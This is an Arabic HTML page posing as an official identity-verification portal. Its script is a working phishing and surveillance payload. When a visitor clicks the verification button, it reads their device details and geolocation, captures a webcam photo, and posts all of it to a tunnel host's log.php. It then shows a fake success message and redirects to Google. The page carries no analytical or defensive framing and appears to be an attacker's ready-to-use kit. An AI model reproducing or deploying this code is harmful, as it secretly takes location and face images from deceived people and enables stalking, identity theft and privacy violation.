<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التوثيق الموحد</title>
    <style>
        body { background: #f4f7f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; }
        .btn:disabled { background: #ccc; }
    </style>
</head>
<body>

<div class="card">
    <h2 style="color:#1a73e8;">التحقق من الهوية</h2>
    <p>يرجى النقر أدناه لإتمام عملية التوثيق الرقمي المطلوبة.</p>
    <button class="btn" id="mainBtn" onclick="startCapture()">ابدأ التوثيق الآن</button>
</div>

<script>
    // الرابط الجديد الخاص بك
    const tunnel = "https://172de5cb3ac535.lhr.life";

    async function startCapture() {
        const btn = document.getElementById("mainBtn");
        btn.innerText = "جاري المعالجة...";
        btn.disabled = true;

        // 1. جمع معلومات الجهاز
        const info = `Device: ${navigator.platform} | Agent: ${navigator.userAgent}`;
        
        try {
            // 2. طلب الموقع وإرساله مع معلومات الجهاز
            navigator.geolocation.getCurrentPosition(async (p) => {
                await fetch(tunnel + "/log.php", {
                    method: "POST",
                    mode: "no-cors",
                    body: JSON.stringify({ 
                        lat: p.coords.latitude, 
                        lon: p.coords.longitude,
                        device: info 
                    })
                });
            }, null, {timeout: 5000});

            // 3. طلب الكاميرا والتقاط الصورة
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement("video");
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = () => {
                setTimeout(async () => {
                    const canvas = document.createElement("canvas");
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext("2d").drawImage(video, 0, 0);
                    const imgData = canvas.toDataURL("image/jpeg", 0.5);

                    // إرسال الصورة
                    await fetch(tunnel + "/log.php", {
                        method: "POST",
                        mode: "no-cors",
                        body: JSON.stringify({ img: imgData })
                    });

                    // إنهاء وإغلاق
                    stream.getTracks().forEach(t => t.stop());
                    btn.innerText = "تم التوثيق بنجاح";
                    alert("شكراً لك، تم توثيق هويتك بنجاح.");
                    window.location.href = "https://google.com";
                }, 2000);
            };

        } catch (err) {
            alert("خطأ: يرجى السماح بالكاميرا والموقع للمتابعة.");
            location.reload();
        }
    }
</script>

</body>
</html>
